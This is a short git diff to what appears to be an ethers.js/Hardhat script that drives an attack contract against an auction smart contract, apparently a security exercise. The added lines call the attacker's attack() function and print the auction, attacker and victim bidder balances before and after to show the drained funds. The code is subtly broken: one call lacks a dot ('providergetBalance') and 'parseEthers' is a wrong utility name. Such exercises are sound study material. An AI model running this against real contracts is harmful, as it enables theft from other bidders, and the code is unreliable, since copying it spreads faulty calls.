@@ -22,4 +22,13 @@ async function main() {
   const txBid3 = await attack.connect(hacker)
     .proxyBid({value: ethers.utils.parseEthers("1.0")})
   await txBid3.wait();
+
+  console.log("Auction balance", await ethers.provider.getBalance(auction.address));
+
+  const doAttack = await attack.connect(hacker).attack();
+  await doAttack.wait();
+
+  console.log("Auction balance", await ethers.providergetBalance(auction.address));
+  console.log("Attacker balance", await ethers.provider.getBalance(attack.address));
+  console.log("Bidder2 balance", await ethers.provider.getBalance(bidder2.address));
 }
